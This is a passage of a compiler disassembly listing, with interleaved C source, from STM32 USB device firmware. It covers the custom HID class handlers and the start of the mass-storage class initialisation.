 8008c8c:	200000a6 	.word	0x200000a6

08008c90 <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008c90:	b580      	push	{r7, lr}
 8008c92:	b084      	sub	sp, #16
 8008c94:	af00      	add	r7, sp, #0
 8008c96:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008c98:	2181      	movs	r1, #129	; 0x81
 8008c9a:	4815      	ldr	r0, [pc, #84]	; (8008cf0 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008c9c:	f002 fd32 	bl	800b704 <USBD_GetEpDesc>
 8008ca0:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008ca2:	2101      	movs	r1, #1
 8008ca4:	4812      	ldr	r0, [pc, #72]	; (8008cf0 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008ca6:	f002 fd2d 	bl	800b704 <USBD_GetEpDesc>
 8008caa:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008cac:	68fb      	ldr	r3, [r7, #12]
 8008cae:	2b00      	cmp	r3, #0
 8008cb0:	d009      	beq.n	8008cc6 <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008cb2:	68fb      	ldr	r3, [r7, #12]
 8008cb4:	2200      	movs	r2, #0
 8008cb6:	f042 0202 	orr.w	r2, r2, #2
 8008cba:	711a      	strb	r2, [r3, #4]
 8008cbc:	2200      	movs	r2, #0
 8008cbe:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008cc0:	68fb      	ldr	r3, [r7, #12]
 8008cc2:	2205      	movs	r2, #5
 8008cc4:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008cc6:	68bb      	ldr	r3, [r7, #8]
 8008cc8:	2b00      	cmp	r3, #0
 8008cca:	d009      	beq.n	8008ce0 <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008ccc:	68bb      	ldr	r3, [r7, #8]
 8008cce:	2200      	movs	r2, #0
 8008cd0:	f042 0202 	orr.w	r2, r2, #2
 8008cd4:	711a      	strb	r2, [r3, #4]
 8008cd6:	2200      	movs	r2, #0
 8008cd8:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008cda:	68bb      	ldr	r3, [r7, #8]
 8008cdc:	2205      	movs	r2, #5
 8008cde:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008ce0:	687b      	ldr	r3, [r7, #4]
 8008ce2:	2229      	movs	r2, #41	; 0x29
 8008ce4:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008ce6:	4b02      	ldr	r3, [pc, #8]	; (8008cf0 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 8008ce8:	4618      	mov	r0, r3
 8008cea:	3710      	adds	r7, #16
 8008cec:	46bd      	mov	sp, r7
 8008cee:	bd80      	pop	{r7, pc}
 8008cf0:	20000064 	.word	0x20000064

08008cf4 <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 8008cf4:	b580      	push	{r7, lr}
 8008cf6:	b084      	sub	sp, #16
 8008cf8:	af00      	add	r7, sp, #0
 8008cfa:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008cfc:	2181      	movs	r1, #129	; 0x81
 8008cfe:	4815      	ldr	r0, [pc, #84]	; (8008d54 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008d00:	f002 fd00 	bl	800b704 <USBD_GetEpDesc>
 8008d04:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008d06:	2101      	movs	r1, #1
 8008d08:	4812      	ldr	r0, [pc, #72]	; (8008d54 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008d0a:	f002 fcfb 	bl	800b704 <USBD_GetEpDesc>
 8008d0e:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008d10:	68fb      	ldr	r3, [r7, #12]
 8008d12:	2b00      	cmp	r3, #0
 8008d14:	d009      	beq.n	8008d2a <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008d16:	68fb      	ldr	r3, [r7, #12]
 8008d18:	2200      	movs	r2, #0
 8008d1a:	f042 0202 	orr.w	r2, r2, #2
 8008d1e:	711a      	strb	r2, [r3, #4]
 8008d20:	2200      	movs	r2, #0
 8008d22:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008d24:	68fb      	ldr	r3, [r7, #12]
 8008d26:	2205      	movs	r2, #5
 8008d28:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008d2a:	68bb      	ldr	r3, [r7, #8]
 8008d2c:	2b00      	cmp	r3, #0
 8008d2e:	d009      	beq.n	8008d44 <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008d30:	68bb      	ldr	r3, [r7, #8]
 8008d32:	2200      	movs	r2, #0
 8008d34:	f042 0202 	orr.w	r2, r2, #2
 8008d38:	711a      	strb	r2, [r3, #4]
 8008d3a:	2200      	movs	r2, #0
 8008d3c:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008d3e:	68bb      	ldr	r3, [r7, #8]
 8008d40:	2205      	movs	r2, #5
 8008d42:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008d44:	687b      	ldr	r3, [r7, #4]
 8008d46:	2229      	movs	r2, #41	; 0x29
 8008d48:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008d4a:	4b02      	ldr	r3, [pc, #8]	; (8008d54 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008d4c:	4618      	mov	r0, r3
 8008d4e:	3710      	adds	r7, #16
 8008d50:	46bd      	mov	sp, r7
 8008d52:	bd80      	pop	{r7, pc}
 8008d54:	20000064 	.word	0x20000064

08008d58 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008d58:	b580      	push	{r7, lr}
 8008d5a:	b084      	sub	sp, #16
 8008d5c:	af00      	add	r7, sp, #0
 8008d5e:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008d60:	2181      	movs	r1, #129	; 0x81
 8008d62:	4815      	ldr	r0, [pc, #84]	; (8008db8 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008d64:	f002 fcce 	bl	800b704 <USBD_GetEpDesc>
 8008d68:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008d6a:	2101      	movs	r1, #1
 8008d6c:	4812      	ldr	r0, [pc, #72]	; (8008db8 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008d6e:	f002 fcc9 	bl	800b704 <USBD_GetEpDesc>
 8008d72:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008d74:	68fb      	ldr	r3, [r7, #12]
 8008d76:	2b00      	cmp	r3, #0
 8008d78:	d009      	beq.n	8008d8e <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008d7a:	68fb      	ldr	r3, [r7, #12]
 8008d7c:	2200      	movs	r2, #0
 8008d7e:	f042 0202 	orr.w	r2, r2, #2
 8008d82:	711a      	strb	r2, [r3, #4]
 8008d84:	2200      	movs	r2, #0
 8008d86:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008d88:	68fb      	ldr	r3, [r7, #12]
 8008d8a:	2205      	movs	r2, #5
 8008d8c:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008d8e:	68bb      	ldr	r3, [r7, #8]
 8008d90:	2b00      	cmp	r3, #0
 8008d92:	d009      	beq.n	8008da8 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008d94:	68bb      	ldr	r3, [r7, #8]
 8008d96:	2200      	movs	r2, #0
 8008d98:	f042 0202 	orr.w	r2, r2, #2
 8008d9c:	711a      	strb	r2, [r3, #4]
 8008d9e:	2200      	movs	r2, #0
 8008da0:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008da2:	68bb      	ldr	r3, [r7, #8]
 8008da4:	2205      	movs	r2, #5
 8008da6:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008da8:	687b      	ldr	r3, [r7, #4]
 8008daa:	2229      	movs	r2, #41	; 0x29
 8008dac:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008dae:	4b02      	ldr	r3, [pc, #8]	; (8008db8 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008db0:	4618      	mov	r0, r3
 8008db2:	3710      	adds	r7, #16
 8008db4:	46bd      	mov	sp, r7
 8008db6:	bd80      	pop	{r7, pc}
 8008db8:	20000064 	.word	0x20000064

08008dbc <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008dbc:	b480      	push	{r7}
 8008dbe:	b083      	sub	sp, #12
 8008dc0:	af00      	add	r7, sp, #0
 8008dc2:	6078      	str	r0, [r7, #4]
 8008dc4:	460b      	mov	r3, r1
 8008dc6:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008dc8:	687b      	ldr	r3, [r7, #4]
 8008dca:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008dce:	687b      	ldr	r3, [r7, #4]
 8008dd0:	32b0      	adds	r2, #176	; 0xb0
 8008dd2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008dd6:	2200      	movs	r2, #0
 8008dd8:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008ddc:	2300      	movs	r3, #0
}
 8008dde:	4618      	mov	r0, r3
 8008de0:	370c      	adds	r7, #12
 8008de2:	46bd      	mov	sp, r7
 8008de4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008de8:	4770      	bx	lr

08008dea <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008dea:	b580      	push	{r7, lr}
 8008dec:	b084      	sub	sp, #16
 8008dee:	af00      	add	r7, sp, #0
 8008df0:	6078      	str	r0, [r7, #4]
 8008df2:	460b      	mov	r3, r1
 8008df4:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008df6:	687b      	ldr	r3, [r7, #4]
 8008df8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008dfc:	687b      	ldr	r3, [r7, #4]
 8008dfe:	32b0      	adds	r2, #176	; 0xb0
 8008e00:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e04:	2b00      	cmp	r3, #0
 8008e06:	d101      	bne.n	8008e0c <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008e08:	2303      	movs	r3, #3
 8008e0a:	e017      	b.n	8008e3c <USBD_CUSTOM_HID_DataOut+0x52>
  }

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008e0c:	687b      	ldr	r3, [r7, #4]
 8008e0e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e12:	687b      	ldr	r3, [r7, #4]
 8008e14:	32b0      	adds	r2, #176	; 0xb0
 8008e16:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e1a:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008e1c:	687b      	ldr	r3, [r7, #4]
 8008e1e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008e22:	687a      	ldr	r2, [r7, #4]
 8008e24:	33b0      	adds	r3, #176	; 0xb0
 8008e26:	009b      	lsls	r3, r3, #2
 8008e28:	4413      	add	r3, r2
 8008e2a:	685b      	ldr	r3, [r3, #4]
 8008e2c:	68db      	ldr	r3, [r3, #12]
 8008e2e:	68fa      	ldr	r2, [r7, #12]
 8008e30:	7810      	ldrb	r0, [r2, #0]
 8008e32:	68fa      	ldr	r2, [r7, #12]
 8008e34:	7852      	ldrb	r2, [r2, #1]
 8008e36:	4611      	mov	r1, r2
 8008e38:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008e3a:	2300      	movs	r3, #0
}
 8008e3c:	4618      	mov	r0, r3
 8008e3e:	3710      	adds	r7, #16
 8008e40:	46bd      	mov	sp, r7
 8008e42:	bd80      	pop	{r7, pc}

08008e44 <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008e44:	b580      	push	{r7, lr}
 8008e46:	b084      	sub	sp, #16
 8008e48:	af00      	add	r7, sp, #0
 8008e4a:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008e4c:	687b      	ldr	r3, [r7, #4]
 8008e4e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e52:	687b      	ldr	r3, [r7, #4]
 8008e54:	32b0      	adds	r2, #176	; 0xb0
 8008e56:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e5a:	2b00      	cmp	r3, #0
 8008e5c:	d101      	bne.n	8008e62 <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008e5e:	2303      	movs	r3, #3
 8008e60:	e01c      	b.n	8008e9c <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008e62:	687b      	ldr	r3, [r7, #4]
 8008e64:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e68:	687b      	ldr	r3, [r7, #4]
 8008e6a:	32b0      	adds	r2, #176	; 0xb0
 8008e6c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e70:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008e72:	4b0c      	ldr	r3, [pc, #48]	; (8008ea4 <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008e74:	7819      	ldrb	r1, [r3, #0]
 8008e76:	68fa      	ldr	r2, [r7, #12]
 8008e78:	230f      	movs	r3, #15
 8008e7a:	6878      	ldr	r0, [r7, #4]
 8008e7c:	f004 f920 	bl	800d0c0 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008e80:	68fb      	ldr	r3, [r7, #12]
 8008e82:	781a      	ldrb	r2, [r3, #0]
 8008e84:	4b08      	ldr	r3, [pc, #32]	; (8008ea8 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008e86:	701a      	strb	r2, [r3, #0]
 8008e88:	4b07      	ldr	r3, [pc, #28]	; (8008ea8 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008e8a:	781b      	ldrb	r3, [r3, #0]
 8008e8c:	f003 0302 	and.w	r3, r3, #2
 8008e90:	2b02      	cmp	r3, #2
 8008e92:	d002      	beq.n	8008e9a <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008e94:	4b05      	ldr	r3, [pc, #20]	; (8008eac <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008e96:	2201      	movs	r2, #1
 8008e98:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008e9a:	2300      	movs	r3, #0
}
 8008e9c:	4618      	mov	r0, r3
 8008e9e:	3710      	adds	r7, #16
 8008ea0:	46bd      	mov	sp, r7
 8008ea2:	bd80      	pop	{r7, pc}
 8008ea4:	200000a7 	.word	0x200000a7
 8008ea8:	2000026c 	.word	0x2000026c
 8008eac:	20000270 	.word	0x20000270

08008eb0 <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008eb0:	b580      	push	{r7, lr}
 8008eb2:	b084      	sub	sp, #16
 8008eb4:	af00      	add	r7, sp, #0
 8008eb6:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008eb8:	687b      	ldr	r3, [r7, #4]
 8008eba:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ebe:	687b      	ldr	r3, [r7, #4]
 8008ec0:	32b0      	adds	r2, #176	; 0xb0
 8008ec2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008ec6:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008ec8:	68fb      	ldr	r3, [r7, #12]
 8008eca:	2b00      	cmp	r3, #0
 8008ecc:	d101      	bne.n	8008ed2 <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008ece:	2303      	movs	r3, #3
 8008ed0:	e016      	b.n	8008f00 <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008ed2:	68fb      	ldr	r3, [r7, #12]
 8008ed4:	69db      	ldr	r3, [r3, #28]
 8008ed6:	2b01      	cmp	r3, #1
 8008ed8:	d111      	bne.n	8008efe <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008eda:	687b      	ldr	r3, [r7, #4]
 8008edc:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008ee0:	687a      	ldr	r2, [r7, #4]
 8008ee2:	33b0      	adds	r3, #176	; 0xb0
 8008ee4:	009b      	lsls	r3, r3, #2
 8008ee6:	4413      	add	r3, r2
 8008ee8:	685b      	ldr	r3, [r3, #4]
 8008eea:	68db      	ldr	r3, [r3, #12]
 8008eec:	68fa      	ldr	r2, [r7, #12]
 8008eee:	7810      	ldrb	r0, [r2, #0]
 8008ef0:	68fa      	ldr	r2, [r7, #12]
 8008ef2:	7852      	ldrb	r2, [r2, #1]
 8008ef4:	4611      	mov	r1, r2
 8008ef6:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008ef8:	68fb      	ldr	r3, [r7, #12]
 8008efa:	2200      	movs	r2, #0
 8008efc:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008efe:	2300      	movs	r3, #0
}
 8008f00:	4618      	mov	r0, r3
 8008f02:	3710      	adds	r7, #16
 8008f04:	46bd      	mov	sp, r7
 8008f06:	bd80      	pop	{r7, pc}

08008f08 <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008f08:	b480      	push	{r7}
 8008f0a:	b083      	sub	sp, #12
 8008f0c:	af00      	add	r7, sp, #0
 8008f0e:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008f10:	687b      	ldr	r3, [r7, #4]
 8008f12:	220a      	movs	r2, #10
 8008f14:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008f16:	4b03      	ldr	r3, [pc, #12]	; (8008f24 <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008f18:	4618      	mov	r0, r3
 8008f1a:	370c      	adds	r7, #12
 8008f1c:	46bd      	mov	sp, r7
 8008f1e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008f22:	4770      	bx	lr
 8008f24:	2000009c 	.word	0x2000009c

08008f28 <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008f28:	b480      	push	{r7}
 8008f2a:	b083      	sub	sp, #12
 8008f2c:	af00      	add	r7, sp, #0
 8008f2e:	6078      	str	r0, [r7, #4]
 8008f30:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008f32:	683b      	ldr	r3, [r7, #0]
 8008f34:	2b00      	cmp	r3, #0
 8008f36:	d101      	bne.n	8008f3c <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008f38:	2303      	movs	r3, #3
 8008f3a:	e009      	b.n	8008f50 <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008f3c:	687b      	ldr	r3, [r7, #4]
 8008f3e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008f42:	687a      	ldr	r2, [r7, #4]
 8008f44:	33b0      	adds	r3, #176	; 0xb0
 8008f46:	009b      	lsls	r3, r3, #2
 8008f48:	4413      	add	r3, r2
 8008f4a:	683a      	ldr	r2, [r7, #0]
 8008f4c:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008f4e:	2300      	movs	r3, #0
}
 8008f50:	4618      	mov	r0, r3
 8008f52:	370c      	adds	r7, #12
 8008f54:	46bd      	mov	sp, r7
 8008f56:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008f5a:	4770      	bx	lr

08008f5c <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008f5c:	b580      	push	{r7, lr}
 8008f5e:	b084      	sub	sp, #16
 8008f60:	af00      	add	r7, sp, #0
 8008f62:	6078      	str	r0, [r7, #4]
 8008f64:	460b      	mov	r3, r1
 8008f66:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008f68:	f241 0074 	movw	r0, #4212	; 0x1074
 8008f6c:	f004 f938 	bl	800d1e0 <USBD_static_malloc_MSC>
 8008f70:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008f72:	68fb      	ldr	r3, [r7, #12]
 8008f74:	2b00      	cmp	r3, #0
 8008f76:	d109      	bne.n	8008f8c <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008f78:	687b      	ldr	r3, [r7, #4]
 8008f7a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f7e:	687b      	ldr	r3, [r7, #4]
 8008f80:	32b0      	adds	r2, #176	; 0xb0
 8008f82:	2100      	movs	r1, #0
 8008f84:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008f88:	2302      	movs	r3, #2
 8008f8a:	e06e      	b.n	800906a <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008f8c:	687b      	ldr	r3, [r7, #4]
 8008f8e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008f92:	687b      	ldr	r3, [r7, #4]
 8008f94:	32b0      	adds	r2, #176	; 0xb0
 8008f96:	68f9      	ldr	r1, [r7, #12]
 8008f98:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008f9c:	687b      	ldr	r3, [r7, #4]
 8008f9e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008fa2:	687b      	ldr	r3, [r7, #4]
 8008fa4:	32b0      	adds	r2, #176	; 0xb0
 8008fa6:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008faa:	687b      	ldr	r3, [r7, #4]
 8008fac:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008fb0:	687b      	ldr	r3, [r7, #4]
 8008fb2:	7c1b      	ldrb	r3, [r3, #16]
 8008fb4:	2b00      	cmp	r3, #0
 8008fb6:	d12b      	bne.n	8009010 <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008fb8:	4b2e      	ldr	r3, [pc, #184]	; (8009074 <USBD_MSC_Init+0x118>)
 8008fba:	7819      	ldrb	r1, [r3, #0]
 8008fbc:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008fc0:	2202      	movs	r2, #2
 8008fc2:	6878      	ldr	r0, [r7, #4]
 8008fc4:	f003 feca 	bl	800cd5c <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008fc8:	4b2a      	ldr	r3, [pc, #168]	; (8009074 <USBD_MSC_Init+0x118>)
 8008fca:	781b      	ldrb	r3, [r3, #0]
 8008fcc:	f003 020f 	and.w	r2, r3, #15
 8008fd0:	6879      	ldr	r1, [r7, #4]
 8008fd2:	4613      	mov	r3, r2
 8008fd4:	009b      	lsls	r3, r3, #2
 8008fd6:	4413      	add	r3, r2
 8008fd8:	009b      	lsls	r3, r3, #2
 8008fda:	440b      	add	r3, r1
 8008fdc:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008fe0:	2201      	movs	r2, #1
 8008fe2:	801a      	strh	r2, [r3, #0]

